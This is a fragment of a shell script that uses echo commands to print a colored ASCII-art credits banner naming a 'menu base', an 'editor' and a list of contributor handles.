echo -e " ${GREEN} "
echo "  +-----------------------------------------------------------------------+ "
echo "  ¦¦¦                        **CREDIS**                                 ¦¦¦ "
echo "  +-----------------------------------------------------------------------+ "                                                         
echo -e "  ¦¦¦${CYAN}                            JAGER: MENU BASE             ¦¦¦ " 
echo -e "  ¦¦¦${CYAN}                            ISOLATION XY: EDITOR         ¦¦¦ "
echo "  +-----------------------------------------------------------------------+ "
echo "  ¦¦¦                         **MY BOIS**                               ¦¦¦ "
echo "  ¦¦¦+--------------------------------------------------------------------+ "
echo -e "  ¦¦¦${CYAN}               FBI SCARECROW                             ¦¦¦ " 
echo -e "  ¦¦¦${CYAN}               YFN                                       ¦¦¦ " 
echo -e "  ¦¦¦${CYAN}               YOURDOGISPHIL                             ¦¦¦ "
echo -e "  ¦¦¦${CYAN}               XNIJIXISO                                 ¦¦¦ "
echo -e "  ¦¦¦${CYAN}               ALPHY                                     ¦¦¦ "
echo -e "  ¦¦¦${CYAN}               PLUS.BEST                                 ¦¦¦ "
echo -e "  ¦¦¦${CYAN}               R6BEAST                                   ¦¦¦ "
